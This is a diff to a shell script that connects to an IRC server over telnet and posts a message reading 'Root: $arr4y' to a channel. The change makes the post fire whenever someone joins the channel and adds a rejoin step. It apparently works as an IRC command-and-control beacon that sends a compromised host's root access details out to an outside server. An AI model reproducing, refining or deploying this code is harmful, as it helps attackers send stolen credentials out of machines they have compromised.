@@ -25,7 +25,6 @@ echo $arr4y;
 echo "NICK $random_user" > input 
 echo "USER $user" >> input
 echo "JOIN #$channel" >> input
-echo "PRIVMSG #$channel :Root: $arr4y :)" >> input
 tail -f input | telnet $server 6667 | while read res
 do
   case "$res" in
@@ -37,7 +36,11 @@ do
     *"You have not"*)
       echo "JOIN #$channel" >> input
     ;;
-    # run when someone joins
-    *JOIN*)
+    *"001"*)
+    echo "JOIN #$channel" >> input
+    ;;
+    *"JOIN"*)
+    echo "PRIVMSG #$channel :Root: $arr4y :)" >> input
+    ;;
   esac
 done
